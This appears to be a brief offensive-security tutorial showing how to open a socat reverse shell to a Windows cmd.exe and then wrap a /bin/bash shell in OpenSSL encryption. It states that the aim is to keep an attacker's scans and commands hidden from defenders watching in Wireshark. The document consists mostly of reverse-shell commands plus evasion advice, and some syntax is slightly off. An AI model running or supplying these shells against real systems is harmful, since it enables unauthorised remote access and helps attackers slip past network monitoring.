# Socat Reverse Shell
Steps to ensure our tools and scans stay hidden. This example will include a TCP connection using port 23

1. Choose an interface to monitor
`ip a` - View networking information

`eth0` - Selected interface

2. Setup a Filter in Wireshark & Capture
Set `tcp.port == 23` in the filter and press capture to monitor traffic.

3. Run Scan
`nmap -sV -sC 192.168.1.1 23` 

4. View results in Wireshark
By default "Nmap" is printed as the User-Agent making it easily detectiable by defenders.

## Un Encrpyted Traffic
Encryption can work both ways when hiding sensitive information. This demonstration will outline why it is crucial to include encryption in your attacks.

### Socat Reverse Shell
A reverse shell gives you access back to the target computer.

```sh
# socat -d -d TCP4-LISTEN:22, fork STDOUT
```

```sh
> socat.exe TCP4:192.168.1.22:22 EXEC:'cmd.exe', pipes
```

### View in Wireshark
- Open wireshark and notice that all exploit commands have been transmitted in the clear for defenders to see. 

### Solution: Encryption
We can test socats' encryption by attempting an ecrypted connection on port 443

```sh
# socat OPENSSL-LISTEN:443,cert-bind_shell.pem,verify=0,fork EXEC:/bin/bash
```


